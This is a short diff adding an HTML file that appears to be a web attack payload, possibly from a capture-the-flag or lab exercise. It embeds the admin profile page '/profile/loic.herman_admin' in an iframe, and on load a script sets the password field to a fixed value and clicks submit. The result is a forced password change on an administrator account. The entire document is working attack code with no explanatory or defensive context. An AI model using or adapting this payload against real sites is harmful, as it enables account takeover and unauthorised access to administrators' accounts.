@@ -1,0 +1,7 @@
+<iframe src="/profile/loic.herman_admin" id="frame" frameborder="0"></iframe>
+<script>
+    document.querySelector("#frame").onload = function() {
+        document.querySelector("#frame").contentDocument.querySelector("input[type=password]").value = 'strongpassword';
+        document.querySelector("#frame").contentDocument.querySelector("button[type=submit]").click();
+    };
+</script>
